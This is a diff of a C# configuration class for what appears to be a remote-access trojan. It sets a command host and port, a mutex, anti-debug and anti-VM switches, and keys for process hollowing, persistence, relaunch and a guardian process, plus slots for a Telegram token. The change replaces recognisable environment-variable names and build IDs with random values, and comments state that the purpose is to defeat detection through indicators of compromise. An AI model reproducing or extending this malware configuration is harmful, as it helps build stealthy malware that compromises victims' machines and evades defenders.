@@ -5,7 +5,7 @@ internal static class Config
     public static readonly string[] Hosts = new[] { "localhost" };
     public const int Port = 5555;
     public const bool UseMutex = true;
-    public const string MutexName = "Global\\2063dbf3d69548aeb5901ab22b3af5c3";
+    public const string MutexName = "Global\\5fe9ea361b254ab9b9084738898fd747";
 
     public const bool AntiDebug = false;
     public const bool AntiVM = false;
@@ -28,14 +28,14 @@ internal static class Config
     public const string CertHash = "07AAB3993AEFC4F6B065B04E1EDA9E20E14649C3852D7079A852B421534AB423";
 
     // Unique per build — changes the compiled binary hash even with identical settings
-    public const string BuildId = "bc87c60a010349c7ae2f73f958e15348";
+    public const string BuildId = "425667d314744cdbb006c490f80675c3";
 
     // Per-build env var names — randomized so no two builds share the same IoC strings
-    public const string EnvKeyHollow        = "__SERO_H__";
-    public const string EnvKeyPersistWorker = "SERO_PERSIST_WORKER";
-    public const string EnvKeyRelaunch      = "SERO_RELAUNCH";
-    public const string EnvKeyExe           = "SERO_EXE";
-    public const string EnvKeyGuardian      = "SERO_GUARDIAN";
+    public const string EnvKeyHollow        = "QyCGWpx8eC";
+    public const string EnvKeyPersistWorker = "D9hdIpEfAl";
+    public const string EnvKeyRelaunch      = "6vjqFQrjWw";
+    public const string EnvKeyExe           = "rN24Xwhywc";
+    public const string EnvKeyGuardian      = "fNJCJ6mJrk";
 
     public const int ReconnectDelayMs = 5000;
     public const int HeartbeatIntervalMs = 3000;
@@ -56,5 +56,5 @@ internal static class Config
     public static readonly byte[] TelegramTokenSfc   = new byte[] {  };
     public static readonly byte[] TelegramChatId1Sfc = new byte[] {  };
     public static readonly byte[] TelegramChatId2Sfc = new byte[] {  };
-    public static readonly byte[] TelegramSfcSeed    = new byte[] { 155, 103, 124, 249, 27, 190, 148, 143, 42, 214, 128, 146, 6, 248, 58, 29, 10, 179, 29, 134, 224, 212, 96, 246, 225, 190, 210, 16, 244, 234, 12, 97 };
+    public static readonly byte[] TelegramSfcSeed    = new byte[] { 30, 107, 54, 25, 243, 231, 82, 18, 131, 98, 253, 8, 159, 155, 84, 247, 96, 105, 132, 234, 235, 67, 22, 235, 122, 217, 187, 184, 32, 119, 37, 43 };
 }
